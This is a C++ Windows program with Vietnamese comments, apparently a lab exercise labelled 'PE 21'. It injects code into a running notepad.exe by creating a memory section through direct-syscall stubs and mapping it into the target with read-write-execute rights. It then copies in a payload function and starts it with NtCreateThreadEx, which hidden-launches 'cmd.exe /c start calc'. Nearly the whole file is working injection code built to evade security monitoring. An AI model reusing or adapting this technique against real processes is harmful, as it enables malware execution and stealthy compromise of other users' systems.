#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Khai báo liên kết ngoại vi tới các cổng gọi hàm trực tiếp tầng thấp đã được đồng bộ
extern "C" NTSTATUS NtCreateSectionProc(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

extern "C" NTSTATUS NtMapViewOfSectionProc(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
);

// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx trích xuất động từ hệ thống
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm trực tiếp thông qua cổng Syscall
DWORD WINAPI RemoteSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Bẻ gãy hoàn toàn lỗi RIP tương đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 21: DV_NEW" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // Trích xuất động con trỏ hàm NtCreateThreadEx trực tiếp từ ntdll.dll để tự thích ứng với số hiệu Build của Windows 11
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // Kích thước hạn mức cấp phát cho phân vùng thực thi gương
    SIZE_T totalPayloadSize = 4096;

    // ─── BƯỚC 1: KHỞI TẠO SECTION THÔ QUA CỔNG DIRECT SYSCALL ───
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { 0 };
    sectionSize.QuadPart = totalPayloadSize;

    NtCreateSectionProc(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!hSection) {
        std::cerr << "[-] Direct Syscall NtCreateSectionProc failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 2: ÁNH XẠ VIEW CỤC BỘ BẰNG DIRECT SYSCALL (QUYỀN RW) ───
    PVOID localViewAddress = NULL;
    SIZE_T localViewSize = totalPayloadSize;
    NtMapViewOfSectionProc(hSection, GetCurrentProcess(), &localViewAddress, 0, 0, NULL, &localViewSize, 1, 0, PAGE_READWRITE);
    std::cout << "[+] Da thiet lap View guong noi bo qua cong Syscall: 0x" << std::hex << localViewAddress << std::endl;

    // Ghi nội dung mã máy của hàm vào vạch xuất phát View gương nội bộ
    PVOID localCodeAddr = localViewAddress;
    memcpy(localCodeAddr, (PVOID)RemoteSyscallPayload, 500);

    // Dữ liệu tham số tuyệt đối nằm lùi lại phía sau 500 byte
    PTHREAD_DATA pLocalDataAddr = (PTHREAD_DATA)((DWORD_PTR)localViewAddress + 500);
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalDataAddr->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalDataAddr->szCommand, "cmd.exe /c start calc");
    std::cout << "[+] Ghi cau truc tham so tuyet doi vao long guong hoan tat." << std::endl;

    // ─── BƯỚC 3: ÁNH XẠ VIEW TỪ XA SANG NOTEPAD BẰNG DIRECT SYSCALL (QUYỀN RWX) ───
    PVOID remoteViewAddress = NULL;
    SIZE_T remoteViewSize = totalPayloadSize;
    NtMapViewOfSectionProc(hSection, hProcess, &remoteViewAddress, 0, 0, NULL, &remoteViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
    std::cout << "[+] PHAN CHIEU DIRECT SYSCALL THÀNH CÔNG: Toa do View tu xa: 0x" << std::hex << remoteViewAddress << std::endl;

    PVOID remoteCodeBuffer = remoteViewAddress;
    PVOID pRemoteDataBuffer = (PVOID)((DWORD_PTR)remoteViewAddress + 500);

    // ─── BƯỚC 4: KÍCH NỔ LUỒNG CPU TỪ XA QUA NTCREATETHREADEX TỰ THÍCH ỨNG ───
    std::cout << "[*] Dang khoi tao luong tu xa de thuc thi ma may..." << std::endl;
    HANDLE hThread = NULL;

    // Gọi thông qua con trỏ thích ứng động để bảo đảm vượt qua mọi sự thay đổi hằng số số hiệu trên Windows 11
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, pRemoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Cấu hình cờ đợi INFINITE gánh luồng sống độc lập
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Direct Syscall Section Mapping Injection Done!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
    }

    // Dọn dẹp tài nguyên cấu trúc phẳng sạch
    UnmapViewOfFile(localViewAddress);
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}